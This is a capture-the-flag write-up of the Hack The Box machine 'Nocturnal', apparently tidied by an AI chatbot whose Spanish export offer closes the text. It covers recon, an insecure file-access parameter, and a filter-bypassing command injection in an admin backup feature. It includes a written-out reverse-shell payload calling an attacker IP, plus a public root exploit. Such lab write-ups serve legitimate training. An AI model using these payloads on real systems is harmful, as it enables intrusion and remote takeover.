---
# HTB - Nocturnal

## Reconnaissance

### Port Scanning

To begin the assessment, a full TCP SYN scan was performed on all ports to identify open services:

```bash
sudo nmap -sS -Pn -n -p- --min-rate 5000 10.10.11.64
````

![Port scan](images/20250727143751.png)

Once the open ports were identified, a more detailed service/version scan was launched on ports 22 and 80:

```bash
sudo nmap -sCV -Pn -n -p22,80 10.10.11.64
```

![Service detection](images/20250727143936.png)

The scan revealed the virtual host `http://nocturnal.htb`. This was added to the local `/etc/hosts` file to resolve the hostname properly:

![Hosts entry](images/20250727144211.png)

## Web Exploration

Upon accessing the domain:

![Main page](images/20250727144235.png)

A test user named `test` was created through the registration form:

![Test user creation](images/20250727144334.png)

The file upload feature allowed only files with the following extensions: `.pdf`, `.doc`, `.docx`, `.xls`, `.xlsx`, `.odt`.

![Upload restrictions](images/20250727144655.png)

Analyzing the URLs generated after uploading files revealed that it was possible to manipulate the `username` and `file` parameters to access files uploaded by other users.

![Path traversal test](images/20250727145006.png)

## Enumeration & File Discovery

A brute-force attack was initiated to enumerate valid usernames and filenames stored on the server:

![Brute-force attack](images/20250727152938.png)

The attack revealed:

* **Username:** `amanda`
* **File:** `privacy.odt`

![File found](images/20250727153012.png)

The file was accessed directly from:

```
http://nocturnal.htb/view.php?username=amanda&file=privacy.odt
```

![File download](images/20250727153131.png)

The document contained Amanda’s credentials:

![Credentials found](images/20250727153219.png)

Using these credentials, access was gained to an administrative panel:

![Admin panel](images/20250727153308.png)

## Vulnerability in Admin Panel

Analyzing the source code of `admin.php` revealed a vulnerable **backup generation** feature:

![Vulnerable code](images/20250727153329.png)

### Vulnerability Summary

* Admins could create ZIP backups of the directory, protected by a password.
* The password field was passed directly into the `zip` shell command via `proc_open()`.
* The `cleanEntry()` function was used for input sanitization but only blacklisted certain characters (`;`, `&`, `|`, `$`, etc.).
* There was no proper escaping or whitelisting of input.

A test for command injection was performed by intercepting and modifying the POST request:

```http
POST /admin.php HTTP/1.1
Host: nocturnal.htb
Content-Type: application/x-www-form-urlencoded

password=%0abash%09-c%09"whoami"&backup=
```

Explanation:

* `%0a`: newline (terminates input)
* `%09`: tab (used to bypass space filtering)
* `bash -c "whoami"`: executes command

![Command injection test](images/20250727153329.png)

## Reverse Shell

After confirming command execution, a reverse shell was triggered using `busybox` with netcat:

```bash
password=%0abash%09-c%09"busybox%09nc%0910.10.14.20%094444%09-e%09/bin/bash”&backup=
```

![Reverse shell sent](images/rev_shell_payload.png)

A listener was opened on the attacker's machine:

![Listener](images/20250727143254.png)

Once inside the shell, the SQLite database was queried, revealing user accounts and password hashes. The user containing the flag was `tobias`.

![SQLite dump](images/20250727143507.png)

The hash was cracked using [hashes.com](https://hashes.com):

![Hash cracked](images/20250727143326.png)

Using the recovered credentials, SSH access was gained:

```bash
ssh tobias@nocturnal.htb
```

![SSH access](images/20250727153703.png)

## Pivoting: Accessing Internal Services

During local enumeration, an internal service was discovered on port `8080`. This service was not accessible externally, so SSH port forwarding was used:

```bash
ssh -L 8081:127.0.0.1:8080 tobias@nocturnal.htb
```

![Port forwarding](images/port_forwarding.png)

The web interface of ISPConfig was exposed at `http://127.0.0.1:8081`. Default credentials were tested and successful:

* **Username:** admin
* **Password:** slowmotionapocalypse

![ISPConfig login](images/ispconfig_login.png)

## Remote Code Execution (RCE)

ISPConfig was running a version affected by the critical vulnerability:

> **CVE-2023-46818** – Remote Code Execution

A public exploit was found and executed:

* [https://github.com/engranaabubakar/CVE-2023-46818](https://github.com/engranaabubakar/CVE-2023-46818)

The exploit granted **root** access to the server, successfully completing the CTF challenge.

![Root access](images/root_access.png)

---

- Asegúrate de que todas las imágenes estén correctamente renombradas y almacenadas en la carpeta `images/` dentro del mismo directorio que el `.md`.
- Si necesitas que genere también un `.pdf` o `.html` a partir del `.md`, puedo ayudarte con el comando de `pandoc` o `typora`.

¿Quieres que te lo exporte como `.pdf` o `.html` también?
```
